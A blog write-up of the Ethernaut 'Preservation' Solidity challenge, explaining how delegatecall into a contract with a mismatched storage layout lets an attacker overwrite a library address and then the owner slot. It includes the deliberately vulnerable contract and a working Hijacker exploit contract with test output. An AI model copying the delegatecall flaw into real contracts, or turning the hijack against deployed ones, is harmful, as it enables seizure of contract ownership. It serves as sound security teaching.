###########################
Ethernaut 16: Preservation
###########################
:date: 2023-09-17
:slug: ethernaut-16-preservation
:summary: What even *is* a library?
:tags: 
:author: capu
:featured_image:


Objective
=========
Become the contract owner

Code
====

.. code-block:: solidity
    :linenos: inline
    :hl_lines: 6

    contract Preservation {
        // public library contracts
        address public timeZone1Library;
        address public timeZone2Library;
        address public owner;
        uint256 storedTime;
        // Sets the function signature for delegatecall
        bytes4 constant setTimeSignature = bytes4(
            keccak256("setTime(uint256)")
        );

        constructor(
            address _timeZone1LibraryAddress,
            address _timeZone2LibraryAddress
        ) {
            timeZone1Library = _timeZone1LibraryAddress;
            timeZone2Library = _timeZone2LibraryAddress;
            owner = msg.sender;
        }

        // set the time for timezone 1
        function setFirstTime(uint256 _timeStamp) public {
            timeZone1Library.delegatecall(
                abi.encodePacked(setTimeSignature, _timeStamp)
            );
        }

        // set the time for timezone 2
        function setSecondTime(uint256 _timeStamp) public {
            timeZone2Library.delegatecall(
                abi.encodePacked(setTimeSignature, _timeStamp)
            );
        }
    }

    // Simple library contract to set the time
    contract LibraryContract {
        // stores a timestamp
        uint256 storedTime;

        function setTime(uint256 _time) public {
            storedTime = _time;
        }
    }

the level factory creates two instances of the ``LibraryContract`` and passes
them as constructor parameters.

Solution
========
there are two big smells with this one

- the library contract is, well, not a library. It uses the ``contract`` keyword
  and has a state of its own.
- the delegatecall'd contract doesn't have the same storage layout as the caller.

Hold on, what actually *is* a library?
--------------------------------------

    A library is a piece of code, usually implemented by someone else, exposing
    a programatical interface which runs in the same environment as the rest of
    *your* code and solves a particular problem

    > My abstractooor roomate

A point of contempt with this definition is wether a library can have *state* of
its own, that is, if it can store some information within itself, and
potentially use it to not be idempotent (having two identical calls cause
different effects).

Solidity thankfully allows us to defenestrate that point of nuance, and has a
much more concrete definition of library:

    Libraries are similar to contracts, but their purpose is that they are
    deployed only once at a specific address and their code is reused using the
    DELEGATECALL (CALLCODE until Homestead) feature of the EVM. This means that
    if library functions are called, their code is executed in the context of
    the calling contract [...] libraries are assumed to be stateless.

For layman implementors, this has a few consequences:

- If defining libraries with Solidity's ``library`` keyworkds and regular
  (or ``using..for``) calling syntax, I'll be spared the details, since
  it's a compile error to even define a non-constant state field in a library.
- If I want to use delegatecall manually, I will **not** have the same
  behaviour, nor the same safeguards, as above out of the box.

The contracts for this level try to do the latter without care for how
``DELEGATECALL`` actually works, ``delegatecall`` ing a contract that behaves as
it had a state of its own, when it actually is using the state of the calling
contract.

Concretely, the ``LibraryContract`` will set the first word of storage 
word of the Preservation storage to whatever I want, and what can I find
there?

.. code::

    [I] > forge inspect --pretty  Preservation storageLayout
    | Name             | Type    | Slot | Offset | Bytes |
    |------------------|---------|------|--------|-------|
    | timeZone1Library | address | 0    | 0      | 20    |
    | timeZone2Library | address | 1    | 0      | 20    |
    | owner            | address | 2    | 0      | 20    |
    | storedTime       | uint256 | 3    | 0      | 32    |

... not the owner, sadly, but the first 20 bytes of the first word of storage is
where the ``timeZone1Library`` is stored. I can:

1. set it to some other ``Hijacker`` contract
2. call ``setFirstTime`` on the ``Preservation`` contract
3. ``Preservation`` will ``delegatecall``  to the the ``Hijacker``
4. this ``Hijacker`` will set the third storage slot to the attacker address.

The ``setFirstTime`` function takes a uint256 and not an ``address``, so I'll
have to do a bit of memory shuffling to get it just right:

.. code-block:: solidity

    Hijacker hijacker = new Hijacker(attacker);
    uint256 spookyTimestamp = uint256(uint160(address(hijacker)));
    target.setFirstTime(spookyTimestamp);
    target.setFirstTime(0);

Awesome. But how should the ``Hijacker`` look like?

From above, I know the owner is in storage slot 3. So I should craft a contract
that writes to the third storage slot when a ``setTime(uint256)`` is called on
it:

.. code-block:: solidity

    contract Hijacker {
        address private padding1;
        address private padding2;
        address private owner;
        address immutable private newOwner;

        constructor(address newOwner_){
            newOwner = newOwner_;
        }

        function setTime(uint256) public {
            owner = newOwner;
        }
    }

... let's check the storage layout:

.. code::

    [I] > forge inspect --pretty  Hijacker storageLayout
    | Name     | Type    | Slot | Offset | Bytes |
    |----------|---------|------|--------|-------|
    | padding1 | address | 0    | 0      | 20    |
    | padding2 | address | 1    | 0      | 20    |
    | owner    | address | 2    | 0      | 20    |

... and run the thing:

.. code::

    [I] > forge test --mc Preservation
    [⠊] Compiling...
    [⠆] Compiling 1 files with 0.8.21
    Running 1 test for test/16-Preservation.t.sol:PreservationSolution
    [PASS] testSolution() (gas: 2273944)
    Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 922.32µs
    Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)

😎
